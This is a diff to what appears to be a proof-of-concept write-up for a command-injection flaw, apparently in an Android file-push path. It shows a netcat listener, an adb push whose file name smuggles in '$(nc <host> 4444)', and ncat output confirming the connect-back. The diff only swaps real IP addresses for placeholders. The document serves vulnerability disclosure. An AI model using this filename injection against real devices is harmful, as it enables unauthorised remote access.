@@ -84,7 +84,7 @@ nc -lvnp 4444
 
 Push malicious filename:
 ```bash
-adb push test.txt '/sdcard/$(nc 192.168.1.149 4444)'
+adb push test.txt '/sdcard/$(nc 192.168.X.X 4444)'
 ```
 
 
@@ -94,8 +94,8 @@ Connects back
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 192.168.1.100.
-Ncat: Connection from 192.168.1.100:35880.
+Ncat: Connection from 192.168.1.X.
+Ncat: Connection from 192.168.1.X:35880.
 ~~~
 
 ---
